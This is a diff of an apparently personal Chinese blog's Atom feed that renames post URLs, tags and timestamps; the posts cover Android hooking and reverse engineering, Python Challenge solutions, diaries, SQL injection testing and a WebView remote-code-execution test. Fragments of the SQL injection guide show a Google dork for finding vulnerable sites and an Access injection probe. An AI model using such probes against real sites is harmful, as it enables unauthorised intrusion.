@@ -16,8 +16,8 @@
   
   <entry>
     <title><![CDATA[安卓注入框架Xposed用法详解]]></title>
-    <link href="http://blog.idhyt.com/2015/11/28/4-android-injection-xposed-usage/"/>
-    <id>http://blog.idhyt.com/2015/11/28/4-android-injection-xposed-usage/</id>
+    <link href="http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/"/>
+    <id>http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/</id>
     <published>2015-11-27T17:11:11.000Z</published>
     <updated>2015-12-30T09:31:02.000Z</updated>
     <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
@@ -73,8 +73,8 @@
   
   <entry>
     <title><![CDATA[adb shell常用命令]]></title>
-    <link href="http://blog.idhyt.com/2015/10/31/4-android-adb-shell-command/"/>
-    <id>http://blog.idhyt.com/2015/10/31/4-android-adb-shell-command/</id>
+    <link href="http://blog.idhyt.com/2015/10/31/android-adb-shell-command/"/>
+    <id>http://blog.idhyt.com/2015/10/31/android-adb-shell-command/</id>
     <published>2015-10-31T03:45:11.000Z</published>
     <updated>2015-12-27T09:44:20.000Z</updated>
     <content type="html"><![CDATA[<ul>
@@ -273,8 +273,8 @@
   
   <entry>
     <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
-    <link href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/"/>
-    <id>http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/</id>
+    <link href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/"/>
+    <id>http://blog.idhyt.com/2015/09/25/android-injection-xposed/</id>
     <published>2015-09-24T18:29:11.000Z</published>
     <updated>2015-12-28T02:20:50.000Z</updated>
     <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
@@ -358,11 +358,11 @@
   
   <entry>
     <title><![CDATA[生活碎碎念]]></title>
-    <link href="http://blog.idhyt.com/2015/08/22/1-diary-2015-08-22/"/>
-    <id>http://blog.idhyt.com/2015/08/22/1-diary-2015-08-22/</id>
+    <link href="http://blog.idhyt.com/2015/08/22/diary-2015-08-22/"/>
+    <id>http://blog.idhyt.com/2015/08/22/diary-2015-08-22/</id>
     <published>2015-08-22T07:06:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。<br><a id="more"></a></p>
+    <updated>2015-12-31T11:45:54.000Z</updated>
+    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。</p>
 <p>&#160; &#160; &#160; &#160;简单的生活习惯了，如果有点复杂的事情，自己可能就会不自觉的去抵制，这么久唯一做的感觉有点后悔的事情就是把一个朋友微信给删了，当时有了被忽视的感觉，其实也是有点太过于在乎了。大学毕业后所有朋友的相处方式都是君子之交淡如水的感觉，玩一起的人都是时间轴上的特定事件，没有刻意去经营一些圈子，是这种感觉，不是什么非你不可，而是有你更好。想到了之前微信群里突然正经的讨论了如何定义坏人，我当时说了，只要这个人对我以及我身边的人没有威胁，那我就认为不算是坏人，至于他对于社会的危害，我想我是不能控制的。其实这就是一个没有结果的命题，就相当于每个人定义朋友的方式不同，一个对别人刻薄和不负责人的人，如果对你还ok，你为什么要去否定它？一个对别人还ok，对你总是刻薄的人，你为何要去肯定它？人和人有不同的交集，可能接触的焦点也不同，就简单的去相信它吧。</p>
 <p>&#160; &#160; &#160; &#160;这个渔村不知道有什么特殊的灵气，来这边以后就会经常做梦，而且睡眠还不是很好，总是容易半夜醒，而且有点噪声就会惊醒，之前在家和在学校都是一觉睡到大中午，生活从来没上午的，对于噪声，天空掉下五个字，那都不是事，现在可能慢慢习惯这样了，就不会去特别刻意在意这些反而好了很多，晚上先在床上滚一会找个舒服的姿势，然后就能睡着了，不过还是会做梦，梦太多了，我都忘记梦的是什么了，读研时候我记得有次我好不容易做个梦，然后在梦里不知道碰到什么事情了笑了出来，然后笑声把自己惊醒了，宿舍那三个也是各种惊悚。</p>
 <p>&#160; &#160; &#160; &#160;想到了前几天有个高中同学突然QQ上加我，我当时以为有什么事情就问了她，她说好多朋友几年没联系了也找不到了，QQ自动推荐的人中看到了我就加了，我当时也是挺有些感慨的聊了几句。然后过了两天，我的QQ空间里的动态全是她卖面膜，化妆品的广告，还加我微信我果断拒绝了，怎么好好的一个人，说推销就推销呢，这种感情绑架真的很讨人烦。经常会看到朋友发借钱不还又不好意思要，要了就是丢掉一个朋友，我也是深有体会，我穷我有理的感觉。为什么我们不能做好朋友，为什么有的人不经常联系了就是陌生人，有些人不经常联系了一点都不疏远，这些想法都是大脑来做出的决定，大脑也是被认为是最聪明的东西，可是你再仔细想想，做出这个判断的却是大脑自己啊，思想真奇妙。</p>
@@ -371,22 +371,21 @@
 <p>&#160; &#160; &#160; &#160;这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。于千万人之中，遇见你所要遇见的人；于千万年之中，没有早一步，没有晚一步，刚巧赶上了，那也没有别的话可说，只有相视一笑，享受这美好时光。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。<br>]]>
-    
+    <![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开]]>
     </summary>
     
-      <category term="diary" scheme="http://blog.idhyt.com/tags/diary/"/>
+      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
     
-      <category term="无法描述" scheme="http://blog.idhyt.com/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
+      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[python challenge 21-27]]></title>
-    <link href="http://blog.idhyt.com/2015/08/13/5-python-challenge-21-27/"/>
-    <id>http://blog.idhyt.com/2015/08/13/5-python-challenge-21-27/</id>
+    <link href="http://blog.idhyt.com/2015/08/13/python-challenge-21-27/"/>
+    <id>http://blog.idhyt.com/2015/08/13/python-challenge-21-27/</id>
     <published>2015-08-13T13:55:11.000Z</published>
-    <updated>2015-12-28T06:22:22.000Z</updated>
+    <updated>2015-12-31T12:08:27.000Z</updated>
     <content type="html"><![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
 <h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Yes! This <span class="keyword">is</span> really level <span class="number">21</span> <span class="keyword">in</span> here. </span><br><span class="line">And yes, After you solve it, yo<span class="string">u'll be in level 22!</span><br><span class="line"></span><br><span class="line">Now for the level:</span><br><span class="line"></span><br><span class="line">* We used to play this game when we were kids</span><br><span class="line">* When I had no idea what to do, I looked backwards.</span></span><br></pre></td></tr></table></figure></p>
 <p>说这是个小时候的游戏，击鼓传花，国外的玩法不一样，需要一层层地拆传递的那个东西<br>level 20下载到的那个压缩包的package.pack文件是个压缩文件，使用了zlib和bz2两种方式压缩。<br>需要根据上一次解压得到的结果，判断下一次解压用zlib还是bz2，以及判断得到的数据是正向的还是要look backwards。<br>Zlib压缩的数据开头第一个字节是”\x78”,ASCII码是”x”.<br>BZ压缩的数据开头两个字节是”\x42\x7A”,ASCII码是”BZ”.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    <span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">    data = open(<span class="string">"files/invader/package.pack"</span>, <span class="string">"rb+"</span>).read()</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">"x\x9c"</span>):</span><br><span class="line">            data = zlib.decompress(data)</span><br><span class="line">            result.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.startswith(<span class="string">"BZ"</span>):</span><br><span class="line">            data = bz2.decompress(data)</span><br><span class="line">            result.append(<span class="string">"#"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"\x9cx"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"ZB"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"*"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span>.join(result)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">      <span class="comment">###          ###      ########    ########    ##########  ########</span></span><br><span class="line">    <span class="comment">#######      #######    #########   #########   #########   #########</span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  #########   #########   ########    #########</span></span><br><span class="line">  <span class="comment">##           ##       ##  ########    ########    ########    ######## </span></span><br><span class="line">  <span class="comment">##           ##       ##  ##          ##          ##          ##   ## </span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##          ##          ##          ##    ## </span></span><br><span class="line">    <span class="comment">#######      #######    ##          ##          #########   ##     ## </span></span><br><span class="line">      <span class="comment">###          ###      ##          ##          ##########  ##      ##</span></span><br></pre></td></tr></table></figure></p>
@@ -424,10 +423,10 @@
   
   <entry>
     <title><![CDATA[python challenge 11-20]]></title>
-    <link href="http://blog.idhyt.com/2015/08/10/5-python-challenge-11-20/"/>
-    <id>http://blog.idhyt.com/2015/08/10/5-python-challenge-11-20/</id>
+    <link href="http://blog.idhyt.com/2015/08/10/python-challenge-11-20/"/>
+    <id>http://blog.idhyt.com/2015/08/10/python-challenge-11-20/</id>
     <published>2015-08-10T09:34:11.000Z</published>
-    <updated>2015-12-28T06:21:21.000Z</updated>
+    <updated>2015-12-31T12:07:34.000Z</updated>
     <content type="html"><![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
 <h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" rel="external">python challenge 11</a></h3><p><code>http://www.pythonchallenge.com/pc/return/5808.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11.jpg" alt="11"><br>题目只有一张模糊的图片，源码也没什么提示，看页面title为odd even.<br>猜测这张模糊的图片是否是将两张图片合成的，因此将其奇偶坐标分离开.<br>分离坐标有四种情况，(odd, odd),(odd, even),(even, odd),(even, even).<br>我这里取双奇偶坐标(odd, odd)和(even, even).<br>在PIL库中，使用load函数的效果比使用putpixel和getpixel更高效，因此选择使用load函数.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd_even</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    im = Image.open(<span class="string">"img/python-challenge-11.jpg"</span>)</span><br><span class="line">    w, h = im.size</span><br><span class="line"></span><br><span class="line">    imgs = [Image.new(im.mode, (w / <span class="number">2</span>, h / <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>)]</span><br><span class="line">    imgs_load = [img.load() <span class="keyword">for</span> img <span class="keyword">in</span> imgs]</span><br><span class="line">    org = im.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(w):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(h):</span><br><span class="line">            <span class="keyword">if</span> (i + j) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                org_pos = (i, j)</span><br><span class="line">                new_pos = (i / <span class="number">2</span>, j / <span class="number">2</span>)</span><br><span class="line">                imgs_load[i % <span class="number">2</span>][new_pos] = org[org_pos]</span><br><span class="line"></span><br><span class="line">    [imgs[i].save(<span class="string">'img/python-challenge-11-%d.jpg'</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>)]</span><br></pre></td></tr></table></figure></p>
 <p>最后生成的两张图片是一样的<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11-evil.jpg" alt="11-evil"><br>显示的单词evil即为答案。</p>
@@ -490,10 +489,10 @@
   
   <entry>
     <title><![CDATA[python challenge 0-10]]></title>
-    <link href="http://blog.idhyt.com/2015/08/07/5-python-challenge-0-10/"/>
-    <id>http://blog.idhyt.com/2015/08/07/5-python-challenge-0-10/</id>
+    <link href="http://blog.idhyt.com/2015/08/07/python-challenge-0-10/"/>
+    <id>http://blog.idhyt.com/2015/08/07/python-challenge-0-10/</id>
     <published>2015-08-07T08:06:11.000Z</published>
-    <updated>2015-12-28T06:17:48.000Z</updated>
+    <updated>2015-12-31T12:07:21.000Z</updated>
     <content type="html"><![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="external">http://www.pythonchallenge.com/</a><br>题目出的也是充满想象力，斗智斗勇中。。。<br>解题代码整理在我的 <a href="https://github.com/idhyt/python_challenge" target="_blank" rel="external">github</a></p>
 <h3 id="python_challenge_0"><a href="http://www.pythonchallenge.com/pc/def/0.html" target="_blank" rel="external">python challenge 0</a></h3><p><code>http://www.pythonchallenge.com/pc/def/0.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-0.jpg" alt="0"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2的38次幂</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">274877906944L</span></span><br></pre></td></tr></table></figure>
@@ -576,8 +575,8 @@
   
   <entry>
     <title><![CDATA[安卓逆向学习笔记-ClickButton]]></title>
-    <link href="http://blog.idhyt.com/2015/05/11/4-android-reverse-clickbutton/"/>
-    <id>http://blog.idhyt.com/2015/05/11/4-android-reverse-clickbutton/</id>
+    <link href="http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/"/>
+    <id>http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/</id>
     <published>2015-05-11T09:45:11.000Z</published>
     <updated>2015-12-28T06:49:02.000Z</updated>
     <content type="html"><![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
@@ -791,8 +790,8 @@ Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（
   
   <entry>
     <title><![CDATA[Netbeans动态调试smali文件]]></title>
-    <link href="http://blog.idhyt.com/2015/05/08/4-android-netbeans-debug-smali/"/>
-    <id>http://blog.idhyt.com/2015/05/08/4-android-netbeans-debug-smali/</id>
+    <link href="http://blog.idhyt.com/2015/05/08/android-netbeans-debug-smali/"/>
+    <id>http://blog.idhyt.com/2015/05/08/android-netbeans-debug-smali/</id>
     <published>2015-05-08T13:11:11.000Z</published>
     <updated>2015-12-27T08:55:30.000Z</updated>
     <content type="html"><![CDATA[<p>通过修改apk包来实现动态调试smali文件。</p>
@@ -842,10 +841,10 @@ java -jar <span class="string">"%~dp0signapk.jar"</span> <span class="string">"%
   
   <entry>
     <title><![CDATA[SQL注入测试思路]]></title>
-    <link href="http://blog.idhyt.com/2015/04/21/2-sql-inject/"/>
-    <id>http://blog.idhyt.com/2015/04/21/2-sql-inject/</id>
+    <link href="http://blog.idhyt.com/2015/04/21/technic-sql-inject/"/>
+    <id>http://blog.idhyt.com/2015/04/21/technic-sql-inject/</id>
     <published>2015-04-21T06:46:11.000Z</published>
-    <updated>2015-12-28T06:31:33.000Z</updated>
+    <updated>2015-12-31T11:53:10.000Z</updated>
     <content type="html"><![CDATA[<p>SQL注入测试思路整理</p>
 <h2 id="一-搜索可能有漏洞的网站">一.搜索可能有漏洞的网站</h2><p>利用google收集信息，可以搜索的关键词很多，网上有个术语，把这些称作“Google Dorks”</p>
 <pre><code><span class="string">inurl:</span>index.php?id=
@@ -946,16 +945,16 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
 <pre><code><span class="]]>
     </summary>
     
-      <category term="inject" scheme="http://blog.idhyt.com/tags/inject/"/>
+      <category term="sql" scheme="http://blog.idhyt.com/tags/sql/"/>
     
-      <category term="web" scheme="http://blog.idhyt.com/categories/web/"/>
+      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[WebView组件远程代码执行漏洞]]></title>
-    <link href="http://blog.idhyt.com/2015/04/09/4-android-abusing-webview/"/>
-    <id>http://blog.idhyt.com/2015/04/09/4-android-abusing-webview/</id>
+    <link href="http://blog.idhyt.com/2015/04/09/android-abusing-webview/"/>
+    <id>http://blog.idhyt.com/2015/04/09/android-abusing-webview/</id>
     <published>2015-04-09T03:30:21.000Z</published>
     <updated>2015-04-11T03:11:11.000Z</updated>
     <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;在android的sdk中封装了webView控件,在webView下有一个非常特殊的接口函数addJavascriptInterface,利用这个接口函数可实现穿透webkit控制android 本机。</p>
@@ -966,7 +965,7 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
 <h4 id="2-_activity_my-xml添加Webview控件">2. activity_my.xml添加Webview控件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">WebView</span></span><br><span class="line">     <span class="attribute">android:layout_width</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:layout_height</span>=<span class="value">"wrap_content"</span></span><br><span class="line">     <span class="attribute">android:id</span>=<span class="value">"@+id/webView"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="title">WebView</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h4 id="3-_MainActivity-java添加关键代码">3. MainActivity.java添加关键代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    <span class="comment">// add webview func</span></span><br><span class="line">    WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">    webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);<span class="string">");</span></span><br></pre></td></tr></table></figure>
 <p><br></p>
-<h4 id="4-_测试页面">4. 测试页面</h4><p>&#160; &#160; &#160; &#160;<a href="http://info.idhyt.xyz/vultest/checkwebview.html" target="_blank" rel="external">webview漏洞测试页面</a><br>&#160; &#160; &#160; &#160;<a href="http://info.idhyt.xyz/vultest/webviewexp.html" target="_blank" rel="external">webview漏洞利用页面</a><br><br></p>
+<h4 id="4-_测试页面">4. 测试页面</h4><p>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/checkwebview.html" target="_blank" rel="external">webview漏洞测试页面</a><br>&#160; &#160; &#160; &#160;<a href="http://idhyt.sinaapp.com/vultest/webviewexp.html" target="_blank" rel="external">webview漏洞利用页面</a><br><br></p>
 <h4 id="5-_测试结果">5. 测试结果</h4><p>&#160; &#160; &#160; &#160;在没有使用addJavascriptInterface接口函数的情况下，<br>也会存在远程代码执行漏洞，原因是webview组件默认调用”searchBoxJavaBridge_”对象。<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-1.png" alt=""></p>
 <p>&#160; &#160; &#160; &#160;当使用addJavascriptInterface接口函数时，代码改为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WebView webview = (WebView)findViewById(R.id.webView);</span><br><span class="line">webview.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">webview.getSettings().setJavaScriptCanOpenWindowsAutomatically(<span class="keyword">true</span>);</span><br><span class="line">webview.addJavascriptInterface(<span class="keyword">new</span> test(), <span class="string">"test"</span>);</span><br><span class="line">webview.loadUrl(<span class="string">"http://info.idhyt.xyz/vultest/checkwebview.html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>&#160; &#160; &#160; &#160;测试结果<br>&#160; &#160; &#160; &#160;<img src="http://7xi9s3.com1.z0.glb.clouddn.com/webview-2.png" alt=""></p>
@@ -1005,10 +1004,10 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
   
   <entry>
     <title><![CDATA[无法描述]]></title>
-    <link href="http://blog.idhyt.com/2015/03/23/1-essay-record/"/>
-    <id>http://blog.idhyt.com/2015/03/23/1-essay-record/</id>
+    <link href="http://blog.idhyt.com/2015/03/23/diary-essay-record/"/>
+    <id>http://blog.idhyt.com/2015/03/23/diary-essay-record/</id>
     <published>2015-03-23T13:46:33.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
+    <updated>2015-12-31T11:46:30.000Z</updated>
     <content type="html"><![CDATA[<ul>
 <li><p>世界上最美的情话是，我喜欢的人，它正好也喜欢我<a id="more"></a><br>那最不美的呢<br>它特么的竟然在骗我 :)</p>
 </li>
@@ -1048,19 +1047,19 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
     
     </summary>
     
-      <category term="joke" scheme="http://blog.idhyt.com/tags/joke/"/>
+      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
     
-      <category term="无法描述" scheme="http://blog.idhyt.com/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
+      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[git使用总结]]></title>
-    <link href="http://blog.idhyt.com/2015/01/16/2-git-conclusion/"/>
-    <id>http://blog.idhyt.com/2015/01/16/2-git-conclusion/</id>
+    <link href="http://blog.idhyt.com/2015/01/16/technic-git-conclusion/"/>
+    <id>http://blog.idhyt.com/2015/01/16/technic-git-conclusion/</id>
     <published>2015-01-16T13:46:33.000Z</published>
-    <updated>2015-12-28T06:34:24.000Z</updated>
-    <content type="html"><![CDATA[<p>windows下git使用总结<a id="more"></a></p>
+    <updated>2015-12-31T11:52:09.000Z</updated>
+    <content type="html"><![CDATA[<p>windows下git使用总结</p>
 <h3 id="初始化配置Github">初始化配置Github</h3><ol>
 <li><p>下载msysgit并安装 : <a href="http://msysgit.github.io/" target="_blank" rel="external">http://msysgit.github.io/</a></p>
 </li>
@@ -1139,22 +1138,23 @@ Are you sure you want to continue connecting (yes/no)?
 <h3 id="git详细命令表">git详细命令表</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/git-conclusion-5.png" alt="tool-editor"></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>windows下git使用总结]]>
-    
+    <![CDATA[<p>windows下git使用总结</p>
+<h3 id="初始化配置Github">初始化配置Github</h3><ol>
+<li><p>下载msysgit并安装 : <a href="http://msysgit.github.io/" target="_blank" r]]>
     </summary>
     
       <category term="git" scheme="http://blog.idhyt.com/tags/git/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.com/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[我逝去的2014]]></title>
-    <link href="http://blog.idhyt.com/2015/01/02/1-annual-summary-2014/"/>
-    <id>http://blog.idhyt.com/2015/01/02/1-annual-summary-2014/</id>
+    <link href="http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/"/>
+    <id>http://blog.idhyt.com/2015/01/02/diary-annual-summary-2014/</id>
     <published>2015-01-01T19:51:11.000Z</published>
-    <updated>2015-12-28T06:09:40.000Z</updated>
+    <updated>2015-12-31T11:44:58.000Z</updated>
     <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。），另一种是身边还有一种单身的人一起热闹，第一种是个人问题，好吧，我个人有问题，第二种吧到了这种年纪，都是在晒孩子的，出了校门哪还有这群闲人啊，想想也是醉了。自己呆着打打游戏吧，总觉得有点可惜，出去看看吧，看的是别人在热闹，一个字，冷暖自知（威虎山还不错）。</p>
 <hr>
 
@@ -1177,18 +1177,18 @@ Are you sure you want to continue connecting (yes/no)?
     <![CDATA[<p>&#160; &#160; &#160; &#160;12点，看着别人都是带着wife跨年，先不说这wife是不是自己的，可是我连个wifi都没有，网都连不上，完全不给刷存在感的机会，好心塞。跨年这种事吧，两种情况下才能有气氛，一种是情侣，先不说情侣是不是自己的（又来。。）]]>
     </summary>
     
-      <category term="diary" scheme="http://blog.idhyt.com/tags/diary/"/>
+      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
     
